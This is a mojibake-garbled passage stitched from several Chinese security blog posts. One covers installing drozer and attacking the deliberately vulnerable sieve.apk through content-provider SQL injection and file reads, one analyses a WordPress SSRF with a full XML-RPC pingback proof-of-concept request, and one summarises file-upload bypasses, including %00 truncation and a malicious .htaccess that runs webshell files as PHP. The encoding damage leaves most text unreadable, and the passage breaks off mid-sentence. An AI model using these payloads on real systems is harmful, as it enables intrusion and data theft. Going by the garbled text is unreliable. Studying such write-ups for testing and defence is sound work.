ä¸ºæ˜¯ç”¨pythonå†™çš„ï¼Œæ‰€ä»¥Macå¯ä»¥ä¸‹è½½python.eggæ–‡ä»¶è¿›è¡Œå®‰è£…ã€‚ä½†æ˜¯æƒ³é€šè¿‡easy_installå®‰è£…ï¼Œå¿…é¡»æ‹¥æœ‰ä»¥ä¸‹è¿™äº›æ¨¡å—ï¼š 123456789101112cffi==1.1.2cryptography==0.9.3drozer==2.3.4enum34==1.0.4idna==2.0ipaddress==1.0.14protobuf==2.4.1pyasn1==0.1.8pycparser==2.14pyOpenSSL==0.13six==1.9.0Twisted==10.2.0 è€Œå®‰è£…è¿‡ç¨‹ä¸­ä¸»è¦çš„é”™è¯¯æ˜¯ç”±pyOpenSSLé€ æˆçš„ã€‚ 1.1 å®‰è£…openssl12$ brew uninstall openssl #if installed already$ brew install openssl 1.2 ç¼–è¯‘pyOpenSSLä¸å¹¸çš„æ˜¯åœ¨åé¢å®‰è£…Python.eggè¿˜æ˜¯ä¼šæŠ¥é”™,åŸå› æ˜¯Drozeréœ€è¦ç‰¹æ®Šç‰ˆæœ¬çš„opensslï¼Œæˆ‘ä»¬éœ€è¦ä¸‹è½½ pyOpenSSL v0.13ï¼Œç„¶åç”¨sedæŒ‡ä»¤ä¿®å¤typoï¼Œå…·ä½“æŒ‡ä»¤ï¼š1234$ wget https://pypi.python.org/packages/source/p/pyOpenSSL/pyOpenSSL-0.13.tar.gz$ tar xzvf pyOpenSSL-0.13.tar.gz$ cd pyOpenSSL-0.13$ sed -i &apos;&apos; &apos;s/X509_REVOKED_dup/X509_REVOKED_dupe/&apos; OpenSSL/crypto/crl.c æ¥ä¸‹æ¥æˆ‘ä»¬build OpenSSLï¼Œè¿™é‡Œéœ€è¦æŒ‡æ˜æœ¬æœºä¸­OpenSSL headersæ–‡ä»¶çš„ä½ç½®ï¼š123$ python setup.py build_ext -L/usr/local/opt/openssl/lib -I/usr/local/opt/openssl/include$ python setup.py build$ python setup.py install 1.3 å®‰è£…å…¶ä»–æ”¯æ’‘æ–‡ä»¶ç»ˆäºè¿›å…¥å®‰è£…è¯´æ˜æ–‡æ¡£ä¸­çš„æ­¥éª¤äº†12$ sudo easy_install --allow-hosts pypi.python.org protobuf==2.4.1$ sudo easy_install twisted==10.2.0 #ignore any warnings/errors, it works 1.4 å®‰è£…drozeræœ€åä¸€æ­¥ï¼Œinstall drozer1$ sudo easy_install ./drozer-2.3.4-py2.7.egg 1.5 runnningæ­¤æ—¶å¯ä»¥åœ¨ä»»ä½•ç›®å½•ä¸‹ä½¿ç”¨drozer å‘½ä»¤å•¦ï¼ ä¸‰ï¼šDrozerå…¥é—¨â€” è·å–App Packageä¿¡æ¯æ­¤å¤„ä»¥sieve.apkä¸ºä¾‹ drozeræ¯ä¸ªæ¨¡å—çš„ä½œç”¨ï¼š è·å–AppåŒ…ä¿¡æ¯çš„æ¨¡å—æ˜¯ ** app.package.* : 2.1 è·å–è·å–Androidè®¾å¤‡ä¸Šçš„æ‰€æœ‰çš„å®‰è£…çš„Appçš„åŒ…åå‘½ä»¤æ˜¯ï¼š1run app.package.info -a com.mwr.example.sieve run app.package.list è¿™æ¡å‘½ä»¤ä¼šæŠŠæ‰€æœ‰çš„Appéƒ½åˆ—å‡ºæ¥ï¼Œå¦‚æœæƒ³å…·ä½“æŸ¥æ‰¾æŸä¸ªAppå¯åŠ ä¸Š-f [Appå…³é”®å­—]çš„å‚æ•°ï¼Œå¦‚æŸ¥æ‰¾sieveåœ¨Androidè®¾å¤‡ä¸­çš„åŒ…åï¼š1run app.package.list -f sieve 2.2 è·å–Sieveçš„ä¸€äº›åŸºæœ¬ä¿¡æ¯1run app.package.info -a com.mwr.example.sieve 2.3 Itentify The Attack Surface(ç¡®å®šæ”»å‡»é¢)è¿™ä¸ªæµ‹è¯•æ•™ç¨‹ä¸»è¦å…³æ³¨çš„æ˜¯Android å›ºæœ‰çš„IPCé€šä¿¡æœºåˆ¶çš„è„†å¼±æ€§ï¼Œè¿™äº›ç‰¹ç‚¹å¯¼è‡´äº†Appæ³„æ¼æ•æ„Ÿä¿¡æ¯ç»™åŒä¸€å°è®¾å¤‡ä¸Šçš„å…¶å®ƒAppã€‚ æŸ¥æ‰¾å¯ä»¥è¿›è¡ŒAttack Surfaceçš„ç»„ä»¶çš„å‘½ä»¤ï¼š1run app.package.attacksurface com.mwr.example.sieve ç»“æœæ˜¾ç¤ºäº†æ½œåœ¨å¯ä»¥åˆ©ç”¨çš„ç»„ä»¶ä¸ªæ•°ï¼š â€œexportedâ€è¡¨ç¤ºç»„ä»¶å¯ä»¥è¢«å…¶ä»–Appä½¿ç”¨ã€‚ services is debuggableè¡¨ç¤ºæˆ‘ä»¬å¯ä»¥ç”¨adbç»‘å®šä¸€ä¸ªè°ƒè¯•å™¨åˆ°è¿›ç¨‹ã€‚ 2.4 è¿›ä¸€æ­¥è·å–Attack Surfaceçš„ä¿¡æ¯å¦‚è¿›ä¸€æ­¥è·å–ativityç»„å»ºçš„attack surfaceä¿¡æ¯çš„å‘½ä»¤æ˜¯ï¼š1run app.activity.info -a com.mwr.example.sieve 2.5 å¯åŠ¨Activitiesä¸Šå›¾çš„PWListå’ŒFileSelectActivityæ˜¯exportedå¹¶ä¸”ä¸éœ€è¦ä»»ä½•æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨drozerå¯åŠ¨ä»–ä»¬ï¼Œæ¯”å¦‚æ„Ÿè§‰PWListè¿™ä¸ªå«é‡‘é‡åº”è¯¥å¤§ä¸€ç‚¹ï¼Œæ‰€ä»¥å°±å¯åŠ¨å®ƒäº†ï¼Œå‘½ä»¤æ˜¯ï¼š1run app.activity.start â€“component com.mwr.example.sieve com.mwr.example.sieve.PWList 2.6 ä»Content Providerä¸­è·å–ä¿¡æ¯æ¥ä¸Š2.3èŠ‚ï¼Œè¿›ä¸€æ­¥è·å–content providerçš„attact surfaceçš„ä¿¡æ¯çš„å‘½ä»¤æ˜¯ï¼š1run app.provider.info -a com.mwr.example.sieve ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°2.3èŠ‚ä¸­ä¸¤ä¸ªexportedçš„content providerçš„å…·ä½“ä¿¡æ¯ï¼ŒåŒ…æ‹¬åå­—ï¼Œæƒé™ï¼Œè®¿é—®è·¯å¾„ç­‰ã€‚ 2.6.1 æŸ¥æ‰¾å¯ä»¥è®¿é—®Content Providerçš„URIï¼ˆæ•°æ®æ³„æ¼ï¼‰ä»ä¸ŠèŠ‚å›¾ä¸­æˆ‘ä»¬çŒœæµ‹DBContentProviderä¼šæœ‰æŸç§æ ¼å¼çš„æ•°æ®åº“ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“å…¶ä¸­çš„æ•°æ®æ˜¯å¦‚ä½•ç»„ç»‡çš„ã€‚Content URIå¿…é¡»æ˜¯ â€œcontent:///â€ çš„å½¢å¼,å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ éƒ¨åˆ†çš„content URIsæ¥è®¿é—®DBcontent Providerã€‚ ä¸Šå›¾å­˜åœ¨ä¸€ä¸ªéœ€è¦READ_KEYSå’ŒWRITE_KEYSæƒé™æ‰èƒ½è¯»å’Œå†™çš„â€œ/Keysâ€çš„è·¯å¾„ã€‚drozerçš„scanneræ¨¡å—æä¾›äº†ä¸€äº›æ–¹æ³•å»çŒœæµ‹å¯èƒ½å­˜åœ¨çš„content URIsï¼š1run scanner.provider.finduris -a com.mwr.example.sieve ä¸Šå›¾ä¸­æ£€æµ‹å‡ºäº†å¯ä»¥è®¿é—®contentçš„URIï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥ç”¨drozerçš„å…¶ä»–æ¨¡å—å’ŒURIä»contentä¸­è·å–ï¼Œç”šè‡³æ›´æ”¹ä¿¡æ¯ã€‚ å¦‚ï¼š1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“vertical å¦‚ä¸Šå›¾æˆ‘ä»¬è·å–äº†ç”¨æˆ·åï¼Œé‚®ç®±å¸å·ï¼Œå’ŒBase64ç¼–ç çš„å¯†ç å­—ç¬¦ä¸²ã€‚ 2.6.2 è¿›è¡ŒSQLæ³¨å…¥Androidæ“ä½œç³»ç»Ÿå»ºè®®ä½¿ç”¨SQLiteæ•°æ®åº“å­˜å‚¨ç”¨æˆ·æ•°æ®ã€‚SQLiteæ•°æ®åº“ä½¿ç”¨SQLè¯­å¥ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡ŒSQLæ³¨å…¥ã€‚ ä½¿ç”¨projectionå‚æ•°å’Œselecitonå‚æ•°å¯ä»¥ä¼ é€’ä¸€äº›ç®€å•çš„SQLæ³¨å…¥è¯­å¥åˆ°Content providerã€‚å¦‚ï¼š123run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“projection â€œâ€˜â€run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“selection â€œâ€˜â€ ä¸Šé¢ä¸¤æ¡å‘½ä»¤æ‰§è¡ŒåAndroidè®¾å¤‡è¿”å›äº†éå¸¸è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯ã€‚ä½¿ç”¨Sqlæ³¨å…¥åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰æ•°æ®è¡¨ï¼š1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“projection â€œ* FROM SQLITE_MASTER WHERE type=â€™tableâ€™;â€“â€œ ä½¿ç”¨SQLæ³¨å…¥åˆ—å‡ºæ•°æ®è¡¨çš„å†…å®¹ï¼š1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“projection â€œ* FROM Key;â€“â€œ ä½¿ç”¨SQLæ³¨å…¥åˆ—å‡ºæ•°æ®è¡¨çš„å†…å®¹ï¼š1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“projection â€œ* FROM Key;â€“â€œ 2.6.3 ä»File System-Backed Content Providersè·å–ä¿¡æ¯File System-backed Content Provideræä¾›äº†è®¿é—®åº•å±‚æ–‡ä»¶ç³»ç»Ÿçš„æ–¹æ³•ï¼ŒAndroidæ²™ç›’ä¼šé˜»æ­¢Appå…±äº«æ–‡ä»¶å…è®¸ï¼Œè€ŒFile System-backed Content Providerå…è®¸Appå…±äº«æ–‡ä»¶ã€‚ å¯¹äºsieveæ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥æ¨æµ‹å‡ºçš„FileBackupProviderå°±æ˜¯ä¸€ä¸ªfile system-backed content providerã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨drozerçš„app.provider.readæ¨¡å—æŸ¥çœ‹æŸä¸ªæ–‡ä»¶ï¼š1run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts å¯ä»¥ä½¿ç”¨app.provider.downloadä¸‹è½½æ–‡ä»¶1run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db 2.6.4 æ£€æŸ¥Content Providerçš„è„†å¼±æ€§æ£€æŸ¥æ˜¯å¦æœ‰SQLæ³¨å…¥ï¼š1run scanner.provider.injection -a com.mwr.example.sieve æ£€æŸ¥æ˜¯å¦å­˜åœ¨éå†æ–‡ä»¶çš„æ¼æ´1run scanner.provider.traversal -a com.mwr.example.sieve æ€»ç»“ä½“ä¼šï¼šæˆ‘è§‰å¾—åœ¨åˆšå¼€å§‹è·å–äº†è½¯ä»¶åŒ…çš„åŸºæœ¬ä¿¡æ¯åï¼Œå°±å…ˆç”¨æ¨¡å—scanneré‡Œé¢çš„å·¥å…·æ‰«ä¸€æ‰«ï¼Œæ‰¾åˆ°ä¸€äº›æ¼æ´æˆ–è€…åˆ©ç”¨ç‚¹åå†è¿›è¡Œä¸‹ä¸€æ­¥ã€‚ 2.7 å’ŒServicesäº¤äº’è·å–æ˜¯exportedçŠ¶æ€çš„servicesçš„å‘½ä»¤ï¼š1run app.service.info -a com.mwr.example.sieve å…³äºServicesçš„æ¨¡å—ï¼šå¦‚å‘æŸä¸ªæœåŠ¡å‘é€ä¿¡æ¯ï¼š1run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService â€“msg 1 5 3 2.8 å…¶ä»–å¸¸ç”¨æ¨¡å— shell.start åœ¨Androidè®¾å¤‡ä¸Šå¼€å¯ä¸€ä¸ªäº¤äº’å¼Linux Shell tools.file.upload / tools.file.downloa tools.setup.busybox / tools.setup.minimalsu å®‰ è£…busyboxæˆ–è€…minimalsuåˆ°Androidè®¾å¤‡ä¸Š å‚è€ƒé“¾æ¥ï¼šhttps://blog.ropnop.com/installing-drozer-on-os-x-el-capitan/http://www.droidsec.cn/%E4%BD%BF%E7%94%A8drozer%E5%AF%B9android%E5%BA%94%E7%94%A8%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/"},{"title":"ã€Code Analysisã€‘wordpress SSRF <4.5","permalink":"http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/","text":"æ¦‚è¿°å‰å‡ å¤©ï¼Œwordpressçˆ†å‡ºä¸€ä¸ªSSRFçš„æ¼æ´ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼ŒæŸ¥é˜…äº†ä¸€ä¸‹ï¼Œç½‘ä¸Šå¹¶æ²¡æœ‰è¯¦ç»†çš„åˆ©ç”¨æ–¹å¼ã€‚ä»¥å‰ä¹Ÿæ²¡æ€ä¹ˆæ¥è§¦è¿‡wordpressï¼Œçœ‹äº†ä¸€ä¸‹å—å½±å“çš„ä»£ç ï¼Œè®°å½•ä¸€ä¸‹è¿‡ç¨‹ã€‚ ipåœ°å€çš„å‡ ç§è¡¨ç¤ºæ–¹å¼ipåœ°å€åŸŸåæœ‰å¤šç§è¡¨ç¤ºæ–¹å¼ï¼Œæµè§ˆå™¨éƒ½èƒ½è¯†åˆ«å‡ºæ¥ã€‚ å¸¸è§çš„ipåœ°å€åŸŸåè¡¨ç¤ºæ–¹æ³• ç‚¹åˆ†åè¿›åˆ¶è¡¨ç¤ºæ³•ï¼Œä¾‹å¦‚192.168.1.2 äºŒè¿›åˆ¶è¡¨ç¤ºæ³•ä¾‹å¦‚11000000101010000000000100000010ï¼Œè¡¨ç¤º192.168.1.2 éå¸¸è§ipåœ°å€åŸŸåè¡¨ç¤ºæ–¹æ³• æ•´æ•°å‹ï¼šå°†ä¸Šè¿°çš„äºŒè¿›åˆ¶ç›´æ¥è½¬æ¢æˆæ•´æ•°3232235778ï¼Œæµè§ˆå™¨é€šè¿‡è®¿é—®http://3232235778 è§£æä¸º192.168.1.2ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥é€šè¿‡å…¬å¼192*256^3+168*256^2+1*256+2=3232235778æ¢ç®— å…«è¿›åˆ¶å‹ï¼šå°†IP 192.168.1.2æ¢æˆ8è¿›åˆ¶0300.0250.01.02ï¼Œåœ¨å‰é¢åŠ ä¸Š0è¡¨ç¤º8è¿›åˆ¶ åå…­è¿›åˆ¶å‹ï¼šå°†IP 192.168.1.2æ¢æˆ16è¿›åˆ¶0xc0.0xA8.1.2ï¼Œåœ¨å‰é¢åŠ ä¸Š0xè¡¨ç¤º16è¿›åˆ¶ æ··åˆå‹ï¼šå³ä»¥ä¸Šçš„å‡ ç§æ–¹å¼çš„ç»“åˆï¼Œ0300.0xA8.1.0x02 ä¸‹é¢å°±æ˜¯é€šè¿‡å…«è¿›åˆ¶ç»•è¿‡æ£€æµ‹ã€‚ ä»£ç è¯¦æƒ…æ¼æ´æˆå› å¤„508 wp_http_validate_url å‡½æ•°1234567891011121314151617......if ( ! $same_host ) &#123; $host = trim( $parsed_url['host'], '.' ); if ( preg_match( '#^\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;$#', $host ) ) &#123; $ip = $host; &#125; else &#123; $ip = gethostbyname( $host ); if ( $ip === $host ) // Error condition for gethostbyname() $ip = false; &#125; if ( $ip ) &#123; $parts = array_map( 'intval', explode( '.', $ip ) ); if ( 127 === $parts[0] || 10 === $parts[0] || 0 === $parts[0] || ( 172 === $parts[0] &amp;&amp; 16 &lt;= $parts[1] &amp;&amp; 31 &gt;= $parts[1] ) || ( 192 === $parts[0] &amp;&amp; 168 === $parts[1] ) ) &#123; ...... è¿™é‡Œçš„ä»£ç é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$åˆ¤æ–­ipæ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•åˆ™é€šè¿‡ç½‘ç»œè·å–ipçš„å€¼ã€‚ä¸‹é¢çš„ifåˆ¤æ–­åˆ™æ˜¯ç”¨æ¥é˜²æ­¢ç»™çš„urlä¸ºå†…ç½‘ipï¼Œä½†æ˜¯ä¸Šè¿°çš„æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥é€šè¿‡8è¿›åˆ¶ç»•è¿‡å†…ç½‘é™åˆ¶ã€‚123456if ( empty( $parsed_url['port'] ) ) return $url; $port = $parsed_url['port']; if ( 80 === $port || 443 === $port || 8080 === $port ) return $url; å†æ¥ä¸‹æ¥å¯ä»¥çœ‹åˆ°ç¨‹åºåˆå¯¹ç«¯å£åšäº†é™åˆ¶ï¼Œåªèƒ½æ‰«æ80,443,8080ç«¯å£ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œé€šè¿‡8è¿›åˆ¶ç»•è¿‡ipåˆ¤æ–­ï¼Œå¯ä»¥æ‰«æå†…ç½‘çš„80,443,8080æ‰¾ä¸€ä¸‹è°ƒç”¨çš„ä½ç½®,å¯ä»¥æ‰¾åˆ°class-wp-xmlrpc-server.phpé€šè¿‡wp_safe_remote_getè°ƒç”¨äº†getå‡½æ•°ï¼Œgetå‡½æ•°ä½¿ç”¨äº†wp_http_validate_urlï¼Œä»è€Œé€ æˆssrf åˆ©ç”¨åˆ©ç”¨çš„æ–¹å¼ä¸ºé€šè¿‡xmlrpc.phpä¸­pingback.pingåŠŸèƒ½æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚POC123456789101112131415161718POST /cms/wordpress/wp442/xmlrpc.php HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 321&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://012.10.10.111:8080/testvul&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://localhost/cms/wordpress/wp442/2016/08/19/hello-world/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt; è¿™é‡Œè®¾ç½®10.10.10.111ä¸ºå—å®³è€… æ€»ç»“åœ¨æµ‹è¯•ä¸­å‘ç°åªèƒ½å¯¹10.x.x.xçš„å†…ç½‘ipè¿›è¡Œåˆ©ç”¨ï¼Œå› ä¸ºæ­£åˆ™çš„åŸå› è‡³å¤šåªèƒ½æœ‰3ä½æ•°å­—ï¼Œä¸€ä½éœ€è¦ä¸º0æ¥è¡¨ç¤º8è¿›åˆ¶ï¼Œæ‰€ä»¥åˆ©ç”¨åªæœ‰10,å¹¶ä¸”åªèƒ½æ‰«æ80,443,8080ç«¯å£ã€‚ç”±äºåˆ©ç”¨ä¸­ä¸å›æ˜¾ï¼Œä¹Ÿå¾ˆéš¾ç¡®å®šæ˜¯å¦æˆåŠŸåˆ©ç”¨ã€‚æ‰€ä»¥è¿™ä¸ªæ´å¯èƒ½å±å®³æ¯”è¾ƒå°ï¼ˆå¤ªèœäº†ï¼Œæƒ³ä¸åˆ°å…¶ä»–çš„åˆ©ç”¨æ–¹å¼ï¼Œæœ‰å…¶ä»–çš„åˆ©ç”¨æ–¹å¼è®°å¾—åˆ†äº«å•Šï¼ï¼ï¼ï¼‰è¿˜æœ‰ä¸€ç§åˆ©ç”¨å°±æ˜¯å¼€å¯xmlrpcçš„wordpressç«™å¯ä»¥è¢«é€šè¿‡pingback.pingæ–¹æ³•æ¥DDOSï¼Œè¿™ä¸ªä»¥å‰å°±æœ‰äººæå‡ºæ¥äº†ã€‚ å‚è€ƒhttp://xlab.baidu.com/wordpress/https://virusdefender.net/index.php/archives/733/"},{"title":"ã€VULNERABLITYã€‘æ–‡ä»¶ä¸Šä¼ å­¦ä¹ æ€»ç»“","permalink":"http://blog.0kami.cn/2016/07/04/old-file-upload/","text":"æ¦‚è¿°è¿™å‡ å¤©ç©ºä¸‹æ¥æ ¹æ®ä¸Šä¼ æ”»å‡»æ¡†æ¶å­¦ä¹ æ€»ç»“ä¸€ä¸‹ä¸Šä¼ æ”»å‡»ã€‚ ä¸Šä¼ æ£€æµ‹æµç¨‹ å®¢æˆ·ç«¯javascriptæ£€æµ‹ï¼ˆæ£€æµ‹æ–‡ä»¶æ‰©å±•åä¸ºä¸»ï¼‰ æœåŠ¡ç«¯MIMEç±»å‹æ£€æµ‹ï¼ˆæ£€æµ‹Content-typeå†…å®¹ï¼‰ æœåŠ¡ç«¯ç›®å½•è·¯åŠ²æ£€æµ‹ï¼ˆæ£€æµ‹è·Ÿpathç›¸å…³çš„å†…å®¹ï¼‰ æœåŠ¡ç«¯æ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼ˆæ£€æµ‹è·Ÿæ–‡ä»¶åç¼€ç›¸å…³çš„å†…å®¹ï¼‰ æœåŠ¡ç«¯æ–‡ä»¶å†…å®¹æ£€æµ‹ï¼ˆæ£€æµ‹å†…å®¹æ˜¯å¦åˆæ³•æˆ–å«æœ‰æ¶æ„ä»£ç ï¼‰ å®¢æˆ·ç«¯javascriptæ£€æµ‹é€šå¸¸æ­¤ç±»æ£€æµ‹ä¼šåœ¨jsæ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªæ£€æµ‹çš„å‡½æ•°ï¼Œä¸€èˆ¬å¯¹ä¸Šä¼ çš„æ–‡ä»¶åç¼€ååšæ£€æµ‹ï¼Œä¾‹å¦‚ä»…å…è®¸ä¸Šä¼ png,jpg,gifç­‰ç±»å‹çš„æ–‡ä»¶ï¼Œå¦‚æœæ£€æµ‹åˆ°çš„æ–‡ä»¶åç¼€åä¸æ˜¯åœ¨è¿™äº›åå•å†…ï¼Œåˆ™ä¸å‘æœåŠ¡å™¨ç«¯ä¼ è¾“æ–‡ä»¶å†…å®¹ã€‚è¿™ç±»æ£€æµ‹ä¹Ÿæ˜¯æœ€å®¹æ˜“ç»•è¿‡çš„æ£€æµ‹ï¼Œå¯ä»¥ä½¿ç”¨firebugä¹‹ç±»çš„æ’ä»¶æŠŠå®ƒç¦æ‰æˆ–è€…é€šè¿‡burpä¹‹ç±»çš„ä»£ç†å·¥å…·è¿›è¡Œç»•è¿‡æäº¤ã€‚ä½¿ç”¨burpï¼Œä¸Šä¼ æ—¶æä¾›ä¸€ä¸ªç™½åå•å†…çš„åç¼€ï¼Œé€šè¿‡burpæ‹¦åŒ…ï¼Œå¹¶ä¿®æ”¹åç¼€åæäº¤ æœåŠ¡ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆMIMEç±»å‹æ£€æµ‹ï¼‰12345678910111213&lt;?php if($_FILES['userfile']['type'] != \"image/gif\") &#123; //æ£€æµ‹Content-type echo \"Sorry, we only allow uploading GIF images\"; exit; &#125; $uploaddir = 'uploads/'; $uploadfile = $uploaddir . basename($_FILES['userfile']['name']); if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) &#123; echo \"File is valid, and was successfully uploaded.\\n\"; &#125; else &#123; echo \"File uploading failed.\\n\"; &#125;?&gt; ä¸Šé¢ä¸ºphpåç«¯æ£€æµ‹MIMEç±»å‹çš„ä¸€ä¸ªä¾‹å­é€šè¿‡åˆ¤æ–­$_FILES[&#39;userfile&#39;][&#39;type&#39;] != &quot;image/gif&quot;æ¥ä¿è¯ä¸Šä¼ çš„ç±»å‹ä¸ºgifç±»å‹çš„æ–‡ä»¶ã€‚ç»•è¿‡è¿™ä¸€ç±»å‹çš„æ£€æµ‹ï¼Œå¯ä»¥é€šè¿‡burpæ‹¦åŒ…ï¼Œå°†åŸContent-Typeç±»å‹è¯¥ä¸ºç¬¦åˆè¦æ±‚çš„image/gifç±»å‹ã€‚ æœåŠ¡ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆç›®å½•è·¯åŠ²æ£€æµ‹ï¼‰æœ‰ä¸€äº›webåº”ç”¨ç¨‹åºæœ‰å¤šä¸ªæ–‡ä»¶å¤¹ç”¨æ¥å­˜å‚¨å›¾ç‰‡æ–‡ä»¶ï¼Œæ‰€ä»¥ä¸ºäº†æ ‡è¯†ä¸Šä¼ çš„å›¾ç‰‡æ˜¯å±äºå“ªä¸ªæ–‡ä»¶å¤¹çš„ï¼Œä¸Šä¼ æ–‡ä»¶æ—¶ä¼šå¸¦ä¸Šæ–‡ä»¶å­˜å‚¨è·¯åŠ²ã€‚è€Œæ­¤æ—¶å¦‚æœå¯¹æ–‡ä»¶ç›®å½•è·¯åŠ²æ£€æµ‹ä¸å¤Ÿå®Œå…¨ï¼Œå¯ä»¥é€šè¿‡æˆªæ–­æ”»å‡»ã€‚ï¼ˆå¦‚%00,windowsä¸‹%80-%90ï¼‰å¦‚ä¸Šä¼ æ—¶æä¾›å­˜å‚¨è·¯åŠ²ä¸ºimage/20160704/å¯ä»¥é€šè¿‡ä¿®æ”¹ä¸ºimage/20160704/evil.php%00æ¥è¾¾åˆ°æˆªæ–­ç›®çš„ã€‚åç«¯ç¨‹åºä¼šå°†è¯¥è·¯åŠ²è¿æ¥ä¸ºimage/20160704/evil.php%00filename.gif00æˆªæ–­å¯¼è‡´æœ€ç»ˆå­˜å‚¨çš„æ–‡ä»¶åä¸ºevil.php æœåŠ¡å™¨ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆæ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼‰ é»‘åå•æ£€æµ‹é»‘åå•æ£€æµ‹é€šå¸¸ä¼šæœ‰ä¸€ä¸ªæ–‡ä»¶åç¼€åé»‘åå•ï¼ˆä¾‹å¦‚html|htm|php|php2|php3|php4|php5â€¦ï¼‰ä½†æ˜¯é€šå¸¸é»‘åå•æ£€æµ‹ä¸èƒ½åŒ…å«æ‰€æœ‰çš„æ¶æ„è„šæœ¬åç¼€ï¼Œé˜²æŠ¤éš¾åº¦ä¼šæ¯”è¾ƒå¤§ï¼Œæ¨èä½¿ç”¨ç™½åå•ç»•è¿‡çš„æ–¹æ³•ï¼š æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ï¼ˆä¾‹å¦‚ç”¨Phpï¼ŒAspç­‰ï¼‰ åå•åˆ—è¡¨ç»•è¿‡(ç”¨é»‘åå•ä¸­æœªæåŠçš„æ–‡ä»¶åç¼€æ¥ç»•è¿‡ï¼Œå¦‚asaï¼Œcerç­‰ä¸å¸¸è§çš„æ–‡ä»¶åç¼€) 0x00æˆªæ–­ï¼ˆaspä¸‹å¯ä»¥å°è¯•ä½¿ç”¨,aspä¸ºä»åå¾€å‰æ‰«ææ‰©å±•åï¼Œevil.asp%00.jpgï¼Œä¼šè¢«è¯†åˆ«ä¸ºjpgï¼Œåªè¦æ£€æµ‹æ–¹å¼å¦‚è¿™ç§å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼ç»•è¿‡ï¼‰ ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡ï¼ˆåªé€‚ç”¨windowsï¼Œå°†æ–‡ä»¶åæ”¹ä¸ºevil.php.æˆ–evil.php (æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªç©ºæ ¼),åœ¨windowsä¸‹ï¼Œä¸å…è®¸è¿™æ ·çš„å‘½åï¼Œæ‰€ä»¥ä¼šå°†.å’Œç©ºæ ¼è‡ªåŠ¨å»æ‰ï¼‰ .htaccessæ–‡ä»¶æ”»å‡»ï¼ˆé…åˆåå•åˆ—è¡¨ç»•è¿‡ï¼Œä¸Šä¼ ä¸€ä¸ªè‡ªå®šä¹‰çš„.htaccessï¼Œå°±å¯ä»¥è½»æ¾ç»•è¿‡å„ç§æ£€æµ‹ï¼‰ .htaccessæ–‡ä»¶æ”»å‡»å¦‚æœé»‘åå•ä¸­æœªåŒ…å«.htaccessåç¼€çš„å¯ä»¥é€šè¿‡é‡å†™è§£æé…ç½®æ¥è¾¾åˆ°è§£æçš„æ•ˆæœé’ˆå¯¹phpï¼Œä¸Šä¼ è‡ªå®šä¹‰.htaccess123&lt;FilesMatch &quot;haha&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; åŒç›®å½•æœ‰ä¸ªæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªåªæœ‰æ–‡ä»¶åå¹¶åŒ…å«å­—ç¬¦ä¸²â€hahaâ€ï¼Œä½†æ˜¯å´æ— ä»»ä½•æ‰©å±•åçš„æ–‡ä»¶é‡Œé¢çš„å†…å®¹æ˜¯ php ä¸€å¥è¯æœ¨é©¬ï¼Œé€šè¿‡èœåˆ€è¿æ¥å¯ä»¥è§£æphpæˆå› ï¼š åœ¨ PHP manual 